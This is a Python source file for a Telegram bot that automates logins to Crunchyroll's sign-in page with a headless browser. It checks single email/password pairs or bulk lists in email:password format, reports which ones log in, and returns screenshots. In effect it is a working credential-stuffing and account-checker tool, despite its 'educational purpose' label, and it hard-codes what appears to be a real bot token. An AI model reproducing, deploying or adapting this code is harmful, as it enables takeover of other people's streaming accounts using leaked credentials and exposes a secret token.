"""
╔══════════════════════════════════════════════════════╗
║   🔐 Crunchyroll Login Automation Bot                ║
║   Made by @yorifederation                            ║
║   For Educational Purpose Only                       ║
╚══════════════════════════════════════════════════════╝

Commands:
  /start  - Welcome with buttons
  /help   - Instructions
  /chk email password - Check login & screenshot
  /bulk   - Bulk check from .txt file
"""

import os
import logging
import asyncio
import time
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters, CallbackQueryHandler
from playwright.async_api import async_playwright

# ════════════════════════════════════════════════════════
# 🔧 CONFIGURATION & RENDER KEEP-ALIVE
# ════════════════════════════════════════════════════════
TOKEN = os.environ.get("BOT_TOKEN") or "8702671509:AAHdAPEjW1AuZ2LSYpmM6eq9e7xJ7IDsRPI"

def run_dummy_server():
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is Live")
        def log_message(self, format, *args): return
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(('0.0.0.0', port), Handler).serve_forever()

threading.Thread(target=run_dummy_server, daemon=True).start()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

user_last_request = {}
RATE_LIMIT_SECONDS = 10

async def is_rate_limited(user_id: int) -> bool:
    current_time = time.time()
    if user_id in user_last_request:
        if current_time - user_last_request[user_id] < RATE_LIMIT_SECONDS:
            return True
    user_last_request[user_id] = current_time
    return False

# ────────────────────────────────────────────────────────
# 🤖 LOGIN LOGIC (Your exact logic + Render fixes)
# ────────────────────────────────────────────────────────

async def login_crunchyroll(email: str, password: str) -> dict:
    async with async_playwright() as p:
        # Added args for Render compatibility
        browser = await p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-setuid-sandbox"])
        page = await browser.new_page(
            viewport={"width": 1280, "height": 800},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        )
        
        result = {"success": False, "screenshot": None, "message": ""}
        
        try:
            sso_url = "https://sso.crunchyroll.com/login?return_url=%2Fauthorize%3Fclient_id%3Dkmj7imhjt_q90lcbzzsj%26redirect_uri%3Dhttps%253A%252F%252Fwww.crunchyroll.com%252Fcallback%26response_type%3Dcookie%26state%3D"
            await page.goto(sso_url, timeout=60000)
            await page.wait_for_load_state("domcontentloaded", timeout=30000)
            await asyncio.sleep(2)
            
            # Your Cookie Logic
            cookie_selectors = ["button:has-text('Accept All')", "button:has-text('Accept all')", "#onetrust-accept-btn-handler"]
            for sel in cookie_selectors:
                try:
                    btn = await page.wait_for_selector(sel, timeout=2000)
                    if btn:
                        await btn.click()
                        await asyncio.sleep(1)
                        break
                except: pass
            
            result["screenshot"] = await page.screenshot()
            
            # Your Email Logic
            email_field = None
            try:
                email_field = await page.wait_for_selector("input[name='login']", timeout=3000)
            except: pass
            
            if not email_field:
                for sel in ["input[name='login']", "input[type='text']", "#login"]:
                    try:
                        email_field = await page.wait_for_selector(sel, timeout=2000)
                        break
                    except: pass
            
            if not email_field:
                result["message"] = "❌ Email field not found"
                return result
            
            await email_field.fill(email)
            await asyncio.sleep(1)
            await email_field.press("Tab")
            await asyncio.sleep(1)
            result["screenshot"] = await page.screenshot()
            
            # Your Password Logic
            password_field = None
            for sel in ["input[name='password']", "input[type='password']", "#password"]:
                try:
                    password_field = await page.wait_for_selector(sel, timeout=3000)
                    break
                except: pass
            
            if not password_field:
                await email_field.press("Enter")
                await asyncio.sleep(2)
                password_field = await page.query_selector("input[type='password']")

            if not password_field:
                result["message"] = "❌ Password field not found"
                return result
            
            await password_field.fill(password)
            result["screenshot"] = await page.screenshot()
            
            # Your Submit Logic
            submit_button = await page.query_selector("button[type='submit']")
            if submit_button: await submit_button.click()
            else: await password_field.press("Enter")
            
            await asyncio.sleep(8)
            await page.wait_for_load_state("domcontentloaded", timeout=30000)
            result["screenshot"] = await page.screenshot()
            
            # Your Result Logic
            final_url = page.url.lower()
            page_content = await page.content()
            
            if "captcha" in page_content.lower(): result["message"] = "⚠️ CAPTCHA Blocked"
            elif "incorrect" in page_content.lower() or "wrong" in page_content.lower(): result["message"] = "❌ Wrong credentials"
            elif "sso.crunchyroll.com/login" in final_url: result["message"] = "❌ Login failed"
            else:
                result["success"] = True
                result["message"] = "✅ Login Successful!"
                
        except Exception as e:
            result["message"] = f"❌ Error: {str(e)[:100]}"
            try: result["screenshot"] = await page.screenshot()
            except: pass
        finally:
            await browser.close()
        return result

# ────────────────────────────────────────────────────────
# 📱 TELEGRAM HANDLERS (Full implementation)
# ────────────────────────────────────────────────────────

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🔐 Check Login", callback_data="check")],
        [InlineKeyboardButton("📋 Help", callback_data="help")],
        [InlineKeyboardButton("📁 Bulk Check", callback_data="bulk")],
        [InlineKeyboardButton("👨‍💻 By @yorifederation", url="https://t.me/yorifederation")]
    ]
    welcome = "🏠 *Welcome to Crunchyroll Login Bot*\n\nThis bot checks Crunchyroll status and sends screenshots.\n\n`/chk email password` - Single\n`/bulk` - Send .txt file"
    await update.message.reply_text(welcome, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = "📚 *Help*\n\n🔐 *Single:* `/chk email password` \n📁 *Bulk:* Send .txt file with `email:password`"
    if update.callback_query: await update.callback_query.message.reply_text(help_text, parse_mode='Markdown')
    else: await update.message.reply_text(help_text, parse_mode='Markdown')

async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_rate_limited(update.effective_user.id):
        await update.message.reply_text("⏳ Wait 10s!")
        return
    if not context.args or len(context.args) < 2:
        await update.message.reply_text("Usage: `/chk email password`")
        return
    
    email, password = context.args[0], " ".join(context.args[1:])
    msg = await update.message.reply_text("🔄 *Checking...*", parse_mode='Markdown')
    res = await login_crunchyroll(email, password)
    
    await msg.edit_text(f"{res['message']}\n📧 `{email}`", parse_mode='Markdown')
    if res["screenshot"]: await update.message.reply_photo(res["screenshot"], caption=f"📸 {email}")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.endswith('.txt'): return
    
    # FIXED: Download for Render/Telegram v20
    tg_file = await context.bot.get_file(doc.file_id)
    path = f"bulk_{doc.file_id}.txt"
    await tg_file.download_to_drive(path)
    
    await update.message.reply_text("🔄 Processing Bulk...")
    with open(path, 'r') as f:
        lines = [l.strip() for l in f if ":" in l]
    
    for line in lines[:10]: # Limit to 10 for safety
        email, password = line.split(":", 1)
        res = await login_crunchyroll(email, password)
        await update.message.reply_text(f"{res['message']} - `{email}`", parse_mode='Markdown')
        await asyncio.sleep(2)
    os.remove(path)

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "check": await query.message.reply_text("Usage: `/chk email password`")
    elif query.data == "help": await cmd_help(update, context)
    elif query.data == "bulk": await query.message.reply_text("Send your .txt file (email:password)")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("chk", cmd_chk))
    app.add_handler(CommandHandler("bulk", lambda u, c: u.message.reply_text("Send .txt file")))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(CallbackQueryHandler(callback_handler))
    print("✅ Bot is running!")
    app.run_polling()

if __name__ == "__main__": main()
